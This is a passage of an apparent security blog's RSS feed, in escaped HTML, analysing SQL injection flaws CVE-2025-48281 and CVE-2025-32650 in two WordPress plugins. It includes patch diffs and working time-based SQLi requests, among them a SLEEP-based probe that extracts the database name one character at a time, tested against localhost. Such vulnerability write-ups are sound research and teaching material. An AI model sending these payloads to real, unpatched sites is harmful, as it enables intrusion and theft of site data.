id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-sqli&#34;&gt;&lt;span&gt;Detect SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Send a &lt;strong&gt;GET request&lt;/strong&gt; containing an SQLi payload.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /designs/?orderby=(SELECT&amp;#43;SLEEP(5)) HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The resulting SQL becomes:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT * FROM wp_mystyle_designs  WHERE ms_access = 0  ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25&#xA;                OFFSET 0&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/time_resp.png&#34; title=&#34;Time-based SQLi Response&#34; data-thumbnail=&#34;/posts/2025-09-27-cve-2025-48281/time_resp.png&#34; data-sub-html=&#34;&lt;h2&gt;time response&lt;/h2&gt;&lt;p&gt;Time-based SQLi Response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-27-cve-2025-48281/time_resp.png&#39; alt=&#34;time response&#34; height=&#34;259&#34; width=&#34;399&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Time-based SQLi Response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 Based on the response time =&amp;gt; the payload is effective.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;In this case, do not append a comment after &lt;code&gt;SLEEP&lt;/code&gt;. Because the developer has an Enter/newline that moves &lt;strong&gt;OFFSET&lt;/strong&gt; to the next line; if you comment it out, the SQL parser may return an error.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/debug.png&#34; title=&#34;Debug SQL Error&#34; data-thumbnail=&#34;/posts/2025-09-27-cve-2025-48281/debug.png&#34; data-sub-html=&#34;&lt;h2&gt;debug&lt;/h2&gt;&lt;p&gt;Debug SQL Error&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-27-cve-2025-48281/debug.png&#39; alt=&#34;debug&#34; height=&#34;211&#34; width=&#34;1170&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debug SQL Error&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The chain will be split into two queries on different lines causing an error:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT * FROM wp_mystyle_designs  WHERE ms_access = 0  ORDER BY (SELECT SLEEP(5)) -- ASC LIMIT 25               &#xA;OFFSET 0&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;get-first-letter-of-database-name&#34;&gt;&lt;span&gt;Get First Letter of Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-first-letter-of-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;A prerequisite for dumping data is being able to extract a single character of the database name — if you can get one character, you can typically dump the rest.&lt;/p&gt;&#xA;&lt;p&gt;Send a request with an SQLi payload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This uses &lt;code&gt;SUBSTRING()&lt;/code&gt; to get the first character of the &lt;strong&gt;database name&lt;/strong&gt;, and &lt;code&gt;IF()&lt;/code&gt; returns &lt;code&gt;SLEEP(5)&lt;/code&gt; if that character equals &lt;code&gt;0x77&lt;/code&gt; (&amp;lsquo;w&amp;rsquo;).&lt;/p&gt;&#xA;&lt;p&gt;Hex encoding &lt;code&gt;w&lt;/code&gt; as &lt;code&gt;0x77&lt;/code&gt; is used because &lt;code&gt;orderby&lt;/code&gt; comes from a &lt;strong&gt;GET&lt;/strong&gt; parameter that may be escaped by WordPress magic quotes.&lt;/p&gt;&#xA;&lt;p&gt;👉 Based on the response time =&amp;gt; the first character is &lt;code&gt;w&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-48281&lt;/strong&gt; vulnerability in the WordPress &lt;strong&gt;MyStyle Custom Product Designer&lt;/strong&gt; plugin prior to version &lt;strong&gt;3.21.2&lt;/strong&gt; stems from directly inserting user-controlled input into SQL without sufficient validation, leading to SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;The official patch implements a whitelist which ensures the input is validated and safer.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Strictly validate user input.&lt;/li&gt;&#xA;&lt;li&gt;Always use &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; when working with the database in WordPress to avoid SQL Injection.&lt;/li&gt;&#xA;&lt;li&gt;Regularly update plugins and perform security checks to avoid becoming a target.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/mystyle-custom-product-designer/vulnerability/wordpress-mystyle-custom-product-designer-3-21-1-sql-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MyStyle Custom Product Designer Plugin &amp;lt;= 3.21.1 is vulnerable to SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-32650 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-09-26-cve-2025-32650/</link>
      <pubDate>Fri, 26 Sep 2025 10:36:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-09-26-cve-2025-32650/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-26-cve-2025-32650/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;The vulnerability occurs in the &lt;strong&gt;Accessibility Suite&lt;/strong&gt; plugin for WordPress before version &lt;strong&gt;4.19&lt;/strong&gt;.&#xA;This allows an attacker to directly interact with the database, potentially stealing sensitive information.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-32650&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-32650&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/online-accessibility/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Accessibility Suite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.18&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS Severity&lt;/strong&gt;: High (8.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Accessibility Suite&lt;/strong&gt;:  v4.18 (vulnerable) and v4.19 (patched)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; or any other comparison tool to spot version differences&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin failed to properly typecast user input. Although it used &lt;code&gt;prepare()&lt;/code&gt; to prevent SQLi, the implementation was &lt;strong&gt;incorrect&lt;/strong&gt;, leaving the vulnerability exploitable.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Use any diff tool to compare the vulnerable and patched versions.&#xA;A key difference appears in &lt;strong&gt;includes/classes/Helper.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static function save_false_positive($scan_id, $issue_id){&#xA;    // other logic&#xA;    if(! is_admin()) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;    // other logic&#xA;    $list = json_decode(&#xA;        $wpdb-&amp;gt;get_results($wpdb-&amp;gt;prepare(&amp;#34;SELECT list FROM  $table_name WHERE scan_id = $scan_id&amp;#34;))[0]-&amp;gt;list // phpcs:ignore&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patched version passes &lt;code&gt;$scan_id&lt;/code&gt; as a parameter to the query instead of directly concatenating it.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static function save_false_positive($scan_id, $issue_id){&#xA;    // other logic&#xA;    if(! is_admin()) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;    // other logic&#xA;    $scan_id = absint($scan_id); // Ensure scan_id is a positive integer&#xA;    &#xA;    if (!$scan_id) {&#xA;        return [&amp;#34;status&amp;#34; =&amp;gt; &amp;#34;failed&amp;#34;, &amp;#34;msg&amp;#34; =&amp;gt; &amp;#34;Invalid scan ID&amp;#34;];&#xA;    }&#xA;    &#xA;    // Get list using properly prepared query&#xA;    $query = $wpdb-&amp;gt;prepare(&#xA;        &amp;#34;SELECT list FROM %i WHERE scan_id = %d&amp;#34;,&#xA;        $table_name,&#xA;        $scan_id&#xA;    );&#xA;    &#xA;    $result = $wpdb-&amp;gt;get_results($query);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-26-cve-2025-32650/patch_diff.png&#34;&#xA;    alt=&#34;Patch Diff&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Patch Diff&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-works&#34;&gt;&lt;span&gt;How it works&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-works&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;The vulnerability resides in the static function &lt;code&gt;save_false_positive&lt;/code&gt; of class &lt;code&gt;Helper&lt;/code&gt; in &lt;strong&gt;includes/classes/Helper.php&lt;/strong&gt;.&#xA;To locate where it’s called, search for &lt;code&gt;save_false_positive&lt;/code&gt; in the plugin directory.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-26-cve-2025-32650/search_1.png&#34;&#xA;    alt=&#34;Search for save_false_positive&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search Function Call&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 The &lt;code&gt;save_false_positive&lt;/code&gt; function is called as a &lt;strong&gt;callback&lt;/strong&gt; by the action hook &lt;code&gt;wp_ajax_ONLINE_ADAv4/save_false_positive&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;When a &lt;strong&gt;POST&lt;/strong&gt; request is sent to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with&#xA;&lt;code&gt;action=ONLINE_ADAv4/save_false_positive&lt;/code&gt;, the callback is executed.&#xA;It requires two POST parameters: &lt;code&gt;issue_id&lt;/code&gt; and &lt;code&gt;scan_id&lt;/code&gt;.&#xA;If they’re missing, the app returns:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&amp;#34;status&amp;#34;:&amp;#34;failed&amp;#34;,&amp;#34;msg&amp;#34;:&amp;#34;Did not receive the scan ID or the issue ID&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function checks if the user has admin privileges; if not, it returns an empty string.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if(! is_admin()) {&#xA;    return &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, the parameters are directly concatenated into the vulnerable SQL query.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detecting-the-sqli&#34;&gt;&lt;span&gt;Detecting the SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detecting-the-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Send a &lt;strong&gt;POST request&lt;/strong&gt; containing an SQLi payload.&#xA;Since it only requires an authenticated user with access to &lt;code&gt;/wp-admin/&lt;/code&gt;, we can use a &lt;strong&gt;subscriber&lt;/strong&gt; role — the lowest privilege in WordPress.&#xA;Higher roles inherit lower privileges, so this confirms the CVE’s description.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=ONLINE_ADAv4/save_false_positive&amp;amp;issue_id=1&amp;amp;scan_id=1 UNION SELECT SLEEP(5)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The resulting SQL query becomes:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT list FROM wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5)&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-26-cve-2025-32650/time_response.png&#34;&#xA;    alt=&#34;Time-based response&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Time-based SQLi Response&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 The delayed response confirms that the SQLi payload works.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Alternative techniques for empty 